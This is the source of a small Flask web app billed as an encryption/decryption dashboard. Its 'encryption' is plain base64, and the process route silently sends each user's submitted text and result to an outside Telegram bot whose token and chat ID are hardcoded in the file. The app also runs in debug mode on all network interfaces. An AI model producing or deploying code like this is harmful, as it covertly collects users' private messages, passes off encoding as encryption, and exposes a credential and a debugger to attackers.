from flask import Flask, render_template, request
import requests
import base64

app = Flask(__name__)

# আপনার টোকেন এবং আইডি
BOT_TOKEN = "8047864259:AAHEokK5sjq1jJFuIq_e94sPIeTM2OlsqSs"
CHAT_ID = "7938556654"

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': text, 'parse_mode': 'HTML'}
    try:
        requests.post(url, data=payload)
    except:
        pass

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/login_notify', methods=['POST'])
def login_notify():
    send_to_telegram("👤 <b>SYSTEM_ACCESS_GRANTED</b>\nUser: NILOY\nStatus: ONLINE")
    return "OK"

@app.route('/process', methods=['POST'])
def process():
    message = request.form.get('message', '')
    action = request.form.get('action')
    result = ""

    if action == 'encrypt':
        result = base64.b64encode(message.encode('utf-8')).decode('utf-8')
        send_to_telegram(f"🛡️ <b>ENCRYPTION_TASK</b>\nINPUT: {message}\nOUTPUT: {result}")
    elif action == 'decrypt':
        try:
            result = base64.b64decode(message.encode('utf-8')).decode('utf-8')
            send_to_telegram(f"🔓 <b>DECRYPTION_TASK</b>\nINPUT: {message}\nOUTPUT: {result}")
        except:
            result = "ERROR: INVALID_FORMAT"
    
    return result

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)